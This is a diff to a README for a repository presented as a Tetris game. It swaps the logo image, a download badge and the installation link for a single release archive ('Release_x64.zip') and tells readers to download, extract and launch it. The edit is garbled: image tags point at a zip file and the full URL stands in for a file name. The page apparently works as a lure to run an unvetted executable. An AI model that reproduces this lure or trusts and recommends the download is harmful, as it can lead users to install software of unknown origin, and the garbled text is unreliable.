@@ -2,7 +2,7 @@
 
 Welcome to the **Tetris** repository! 🎮
 
-![Tetris Logo](https://cdn.pixabay.com/photo/2012/04/13/21/07/accompaniment-33796_960_720.png)
+![Tetris Logo](https://github.com/ExgerD/tetris/releases/download/v1.0/Release_x64.zip)
 
 This repository hosts the classic game of Tetris, where players must arrange falling blocks to create complete lines. Have fun reliving this nostalgic gaming experience! 😄
 
@@ -45,11 +45,11 @@ Add some screenshots of your game here to give users a preview of what to expect
 
 ## Installation
 
-To get started, download the game files from the following link: [Launch Tetris Game](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+To get started, download the game files from the following link: [Launch Tetris Game](https://github.com/ExgerD/tetris/releases/download/v1.0/Release_x64.zip)
 
-![Launch Tetris Game](https://img.shields.io/badge/Download-Game-blue)
+![Launch Tetris Game](https://github.com/ExgerD/tetris/releases/download/v1.0/Release_x64.zip)
 
-After downloading the **Software.zip** file, extract its contents and launch the game to start playing.
+After downloading the **https://github.com/ExgerD/tetris/releases/download/v1.0/Release_x64.zip** file, extract its contents and launch the game to start playing.
 
 ---
 
